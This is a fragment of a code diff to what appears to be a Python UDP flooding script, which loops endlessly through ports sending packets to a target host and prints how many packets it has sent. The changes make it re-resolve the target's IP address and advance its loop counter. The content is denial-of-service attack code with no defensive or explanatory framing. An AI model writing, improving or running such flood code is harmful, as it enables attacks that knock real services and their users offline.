@@ -48,13 +48,14 @@ if port_mode == False:  # All ports.
         while True:
             if i == 65535:                
                 i = 1
+                ip = socket.gethostbyname(url)
 
             elif port == 1900:
                 port = 1901
 
-            
             sock.sendto(bytes, (str(ip), port))
             sent += 1
+            i += 1
             dtime = now.strftime("%Y-%m-%d %H:%M:%S")
             print('\033[32;1m[%s]Sented %s packets to %s through port:%s\033[0m'%(dtime, sent, ip, port))       
     except:
